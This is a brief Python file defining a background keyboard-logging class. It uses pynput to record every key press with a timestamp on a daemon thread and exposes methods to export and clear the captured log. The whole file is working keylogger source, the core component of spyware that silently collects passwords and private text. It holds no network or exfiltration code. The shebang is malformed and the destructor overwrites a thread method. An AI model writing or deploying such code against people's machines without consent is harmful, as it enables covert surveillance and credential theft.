#/usr/bin/python3
import threading
from pynput.keyboard import Key, Listener
import datetime
import time 
class Logger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.log = []
        self.daemon = True

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self,key):
        # print("Pressed - " + str(key))
        self.time = str(datetime.datetime.now())[:-4]
        self.string = str(self.time)+"-" + str(key) + "\n"
        self.log.append(self.string)
        #print(self.string)
    
    def export_log(self):
        return self.log
    
    def clear_log(self):
        self.log = []
    
    def __del__(self):
        self.is_alive = False